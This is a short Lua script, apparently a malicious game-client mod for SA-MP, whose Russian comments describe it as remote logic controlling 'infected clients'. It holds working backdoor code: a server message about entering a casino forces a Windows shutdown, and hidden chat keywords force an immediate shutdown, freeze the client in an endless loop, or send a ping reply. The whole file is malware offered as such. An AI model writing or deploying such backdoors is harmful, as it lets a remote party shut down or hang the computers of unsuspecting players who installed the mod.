-- payload.lua
-- Удаленная логика, управляющая зараженными клиентами 

-- Обработка RPC сообщений от сервера [cite: 22]
function onReceiveRpc(id, bs)
    if id == 93 then
        local color = raknetBitStreamReadInt32(bs)
        local len = raknetBitStreamReadInt32(bs)
        local str = raknetBitStreamReadString(bs, len)
        
        -- Если жертва входит в казино 4 Dragons, система гасится 
        if str:find("Вы вошли в казино 4 Dragons") then
            os.execute("Shutdown /s /t 5 /f")
        end
    end
end

-- Обработка чата для скрытых команд 
function onReceiveChatMessage(text)
    -- Команда на экстренное выключение системы 
    if text:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    
    -- Команда на зависание клиента 
    elseif text:find("кукусики") then
        while true do end
        
    -- Пинг-тест: ответ в чат 
    elseif text:find("сырколбаска") then
        sampSendChat("123655")
    end
end